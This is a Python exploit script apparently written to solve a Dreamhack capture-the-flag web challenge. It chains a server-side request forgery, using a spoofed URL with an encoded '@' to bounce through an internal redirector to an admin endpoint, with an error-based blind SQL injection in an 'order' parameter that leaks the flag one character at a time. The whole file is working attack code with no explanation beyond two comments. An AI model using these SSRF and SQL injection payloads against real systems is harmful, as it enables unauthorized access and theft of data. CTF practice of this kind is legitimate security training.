import requests
import time
import string

url = "http://host8.dreamhack.games:8609/"
s = requests.Session()

# spoof hostname
res = s.post(f'{url}/fetch', data={
    'url': 'http://example.com%2F@redirector:8081/redir?to=http://internalapi:8081/admin/flag'
})

time.sleep(1)

# error based sqli
charset = string.ascii_lowercase + string.digits + '}_'

flag = 'DH{'

while not flag.endswith('}'):
    for char in charset:
        print("Trying:", char, '|', flag)
        
        payload = f"id and case when (select count(*) from jobs where INSTR(result, '{flag + char}')) then 1 else randomblob(1{'0' * 100}) end"

        res = s.get(f'{url}/audit', params={
            'order': payload
        })

        if res.status_code != 500:
            flag += char
            break

print("Flag:", flag)